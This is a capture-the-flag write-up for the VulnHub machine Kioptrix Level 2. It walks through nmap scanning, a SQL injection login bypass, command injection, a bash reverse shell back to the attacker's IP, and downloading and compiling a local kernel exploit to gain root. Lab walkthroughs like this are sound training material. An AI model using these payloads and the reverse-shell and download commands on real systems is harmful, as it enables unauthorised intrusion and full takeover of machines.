# Kioptrix Level 2

Today, we will be attempting to gain root access to the machine "Kioptrix 2". The second part of the Kioptrix series, please note this machine is also very easy so if you are more experienced I recommend you leave this machine alone.

# *Requirements/Setup*
- Nmap
- A brain
- Ability to host the machine
- $IP defined as your vulnerable machines IP - (`export $IP=[ip]`).

# *Enumeration*

As per routine, we will run a standard nmap scan to being our ventures into this machine.

![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/kioptrix2/Screenshot_2022-10-27_12-52-48.png?raw=true)

```bash
nmap -sV -sC -oN initial.txt $IP
```

After running this scan, we can see it is running an **Apache server** on port `80` and `443`. This could be a potential entry point, upon opening the webserver in our browser, we see a login page.

![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/kioptrix2/Screenshot_2022-10-28_03-53-25.png?raw=true)

Before we run any vulnerability scans, we'll try out a simple test to see if we can perform any SQL injection by typing `admin'#` into the username box.

![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/kioptrix2/Screenshot_2022-10-28_03-54-01.png?raw=true)

Fortunately, it worked and it even gave us access to a new page which looks like we could perform command injection on. 

![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/kioptrix2/Screenshot_2022-10-28_03-57-08.png?raw=true)

By entering the IP address of a server we want to ping and then typing `&& whoami` after it proves we can remotely execute commands from the website. From here, we can try to get a revshell by starting up a netcat listener in a new terminal with:
```bash
nc -lvnp 443
```
Now, we need to execute a command on the website so as it creates a reverse shell, to do this, we will enter the following into the website:
```bash
sh -i >& /dev/tcp/[your-eth0-ip]/443 0>&1
```
If completed successfully, you should have a working reverse shell!

![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/kioptrix2/Screenshot_2022-10-28_04-05-47.png?raw=true)

However, we still haven't gained root, so we are not done yet. First, using a tool called `SearchSploit` we are going to find some potential exploits we can use to perform privilege escalation.

![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/kioptrix2/Screenshot_2022-10-28_04-10-47.png?raw=true)

```bash
searchsploit centos
```
The exploit `9545.c` seems to be a good option, to get thix exploit run:
 ```bash
cp /usr/share/exploitdb/exploits/linux/local/9545.c ~/
```
From here, we have to transfer this file to the machine we are attacking, to do so run the following:
```bash
python3 -m http.server 80
```
After this, your eth0 IP should route to a webserver with some files in it. Now in your rev shell run:
```bash
cd /tmp
curl http://[your-ip]/9545.c -o 9545.c
```
Almost there! Now we need to compile the C file using gcc.
```bash
gcc -o kioptrix 9545.c`
```
![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/kioptrix2/Screenshot_2022-10-28_04-18-20.png?raw=true)

And then simply run `./kioptrix` and if all done correctly you will have root access on the machine! Congrats!
